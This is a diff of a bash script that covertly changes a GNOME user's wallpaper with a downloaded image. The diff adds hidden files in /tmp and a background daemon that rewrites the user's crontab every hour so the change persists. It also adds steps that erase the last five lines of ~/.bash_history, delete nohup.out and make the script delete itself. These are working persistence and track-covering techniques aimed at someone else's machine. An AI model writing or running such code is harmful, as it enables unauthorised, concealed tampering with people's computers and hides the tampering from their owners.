@@ -16,17 +16,22 @@
 #+ that will ensure everything is on the system for the
 #+ change to take affect at 2AM.
 
-site=
+site=       #  Set the website where the image will be obtained from
+file=       #  Define filename if need be - an extra line will need to be added
+            #+ if trying to rename to a specific file
 
-wget $site  #  If using tinyurl, filename will be alias will be downloaded as filename
-mv yykb2s52 /tmp/
-gsettings set org.gnome.desktop.background picture-uri file:///tmp/yyykb2s52
+wget $site  #  If using tinyurl, wget will keep the alias as the filename
+mv $file /home/$USER/$file
+
+# Set the background after running - currently this only works in Gnome
+gsettings set org.gnome.desktop.background picture-uri file:///home/$USER/$file
 
 #  Create file .uwpc.bak which will be called by crontab to set the background
 #+ to /tmp/yykb2s52 && make the file executable
 cat > /tmp/.uwpc.bak <<Write_UWPC
 #!/bin/bash
-gsettings set org.gnome.desktop.background picture-uri file:///tmp/y4k7nt3f
+file=       #  Make sure that you set the same filename
+gsettings set org.gnome.desktop.background picture-uri file:///home/\$USER/\$file
 Write_UWPC
 chmod +x /tmp/.uwpc.bak
 
@@ -34,38 +39,45 @@ chmod +x /tmp/.uwpc.bak
 #+ loop checking for the crontab. This will also check if .uwpc.bak exists &
 #+ if not then create it
 
-cat > /tmp/mps.daemon <<Write_MPS_Daemon
+cat > /tmp/.mps.daemon <<Write_MPS_Daemon
 #!/bin/bash
 while true; do
   #variables set for cron
-  cron=$(crontab -l)
-  chkCron="0 2 * * * ./tmp/mps.daemon"
+  cron=\$(crontab -l)
+  chkCron="0 2 * * * ./tmp/.uwpc.bak"
    
   # Check if cronjob still exists for user
-  if [ "$cron" != "$chkCron" ]; then
-    echo "0 2 * * * ./tmp/mps.daemon" > /tmp/cron
+  if [ "\$cron" != "\$chkCron" ]; then
+    echo "0 2 * * * ./tmp/.uwpc.bak" > /tmp/cron
     crontab /tmp/cron   # Push the above line to crontab
     rm /tmp/cron        # Delete the file once done
   fi
 
   uwpc=/tmp/.uwpc.bak
   # Check if .uwpc.bak exists, if not create it!
-  if [ ! -f "$uwpc" ]; then
+  if [ ! -f "\$uwpc" ]; then
     cat > /tmp/.uwpc.bak <<Write_UWPC_from_Daemon
 #!/bin/bash
-gsettings set org.gnome.desktop.background picture-uri file:///tmp/yykb2s52 
+file=       #  Make sure that you set the same filename
+gsettings set org.gnome.desktop.background picture-uri file:///home/\$USER/\$file 
 Write_UWPC_from_Daemon
-chmod +x /tmp/.uwpc.bak   
-     sleep 30
+chmod +x /tmp/.uwpc.bak
+  fi   
+     sleep 3600 # Run these checks every hour
 done
 Write_MPS_Daemon
-chmod +x /tmp/mps.daemon
-./tmp/mps.daemon & # start up the script and push it to the background
+chmod +x /tmp/.mps.daemon
+/bin/bash /tmp/.mps.daemon & # start up the script and push it to the background
 
+#  Remove the last five lines from .history_bash by placing it in a temp file
+#+ and copying the reduced version to the original
+sleep 10
+head -n -5 ~/.bash_history > ~/.history.tmp
+mv -f ~/.history.tmp ~/.bash_history
+
+#  As script is run with nohup, remove the nohup.out
+rm nohup.out
 
 #  This will self delete the script after running the above commands and
 #+ writing the files. This command should be the last one!
 rm -- "$0"
-
-# TO DO
-# Merge history removal parts held in a different file
